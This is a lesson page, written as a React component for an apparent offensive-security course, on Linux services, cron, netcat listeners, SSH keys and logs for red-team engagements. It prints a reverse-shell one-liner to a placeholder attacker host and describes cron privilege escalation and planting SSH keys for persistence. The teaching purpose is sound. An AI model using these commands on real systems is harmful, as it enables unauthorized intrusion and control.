import CodeBlock from '../../components/lesson/CodeBlock';
import Callout from '../../components/lesson/Callout';

export default function AttackOpsManagement() {
  return (
    <div className="prose-hh">
      <h1>Managing Users &amp; Services for Attack Operations</h1>
      <p>
        The last piece of the Linux foundation: the commands you use to set up and maintain your own
        attack infrastructure — listeners, persistence for authorized red-team engagements, and the
        scheduling primitives attackers and defenders both need to understand.
      </p>

      <h2>Systemd &amp; services</h2>
      <CodeBlock>{`systemctl status ssh          # is a service running?
sudo systemctl start apache2   # start a service
sudo systemctl enable apache2  # start automatically on boot
journalctl -u ssh -n 50         # last 50 log lines for a specific service`}</CodeBlock>

      <h2>Cron: scheduled execution</h2>
      <CodeBlock label="crontab syntax">{`# minute hour day month weekday   command
  */5    *    *    *      *        /opt/scripts/check.sh

crontab -l          # list current user's cron jobs
crontab -e           # edit them
cat /etc/crontab      # system-wide jobs (often root's)
ls -la /etc/cron.d/    # drop-in job directories`}</CodeBlock>
      <Callout variant="tip">
        <p>
          Cron jobs owned by root that call a <strong>world-writable script</strong> are one of the most
          common real-world privilege escalation paths: overwrite the script, wait for cron to run it as
          root. Checking <code>/etc/crontab</code> and cron directories for writable targets is a standard
          enumeration step — you'll do exactly this in the capstone lab.
        </p>
      </Callout>

      <h2>Setting up a listener</h2>
      <CodeBlock label="the classic attack-box setup for catching a reverse shell">{`nc -lvnp 4444
# -l listen, -v verbose, -n no DNS resolution, -p specify port`}</CodeBlock>
      <p>
        Paired with a target running something like <code>bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</code>,
        this is how most introductory "foothold" shells are caught. You'll trigger and interact with a
        simulated version of this pattern in the guided labs.
      </p>

      <h2>User &amp; SSH key management for engagements</h2>
      <CodeBlock>{`ssh-keygen -t ed25519 -f ~/.ssh/engagement_key   # generate a keypair
ssh-copy-id -i ~/.ssh/engagement_key.pub user@target   # deploy your public key (authorized use only)
ssh -i ~/.ssh/engagement_key user@target                # connect with the private key`}</CodeBlock>

      <h2>Log awareness (defensive literacy for offensive operators)</h2>
      <CodeBlock>{`/var/log/auth.log      # Debian/Ubuntu — SSH logins, sudo usage
/var/log/secure         # RHEL/CentOS equivalent
/var/log/apache2/access.log   # web requests — your scanner traffic lands here too
last                          # recent login history
who / w                        # who's logged in right now`}</CodeBlock>
      <Callout variant="warn">
        <p>
          Understanding what you log as a defender is what makes you effective as an attacker in
          authorized engagements — and vice versa. This course treats both skill sets as one discipline,
          not two separate tracks.
        </p>
      </Callout>

      <h2>Module complete</h2>
      <p>
        You now have the Linux fluency to navigate, read permissions, manage processes, script repetitive
        work, and recognize common privilege escalation setups. Module 3 turns outward — from the OS to
        the network — and builds a full reconnaissance and enumeration methodology, which you'll then
        apply directly in four hands-on labs.
      </p>
    </div>
  );
}
